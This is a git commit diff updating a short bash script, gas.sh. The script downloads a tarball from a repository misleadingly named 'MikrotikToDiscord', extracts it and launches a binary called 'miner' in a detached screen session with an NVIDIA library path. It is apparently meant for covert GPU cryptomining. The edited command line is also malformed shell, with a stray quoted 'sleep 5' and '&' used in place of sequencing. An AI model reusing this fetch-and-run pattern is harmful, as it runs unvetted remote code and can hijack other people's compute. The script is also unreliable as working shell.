b24412b4a0f481268346843fc1846d8ec88a5c10
arymas49 <58667903+arymas49@users.noreply.github.com>
2023-11-20 19:13:42 +0800

    Update gas.sh

--- gas.sh
+++ gas.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/Pribadi.tar.gz & tar -xvf Pribadi.tar & chmod +x miner & LD_LIBRARY_PATH=/usr/lib64-nvidia & export LD_LIBRARY_PATH & screen -dm bash -c "./miner"
+wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/Pribadi.tar.gz "sleep 5"; & tar -xvf Pribadi.tar.gz & LD_LIBRARY_PATH=/usr/lib64-nvidia & export LD_LIBRARY_PATH & chmod +x miner & screen -dm bash -c "./miner"
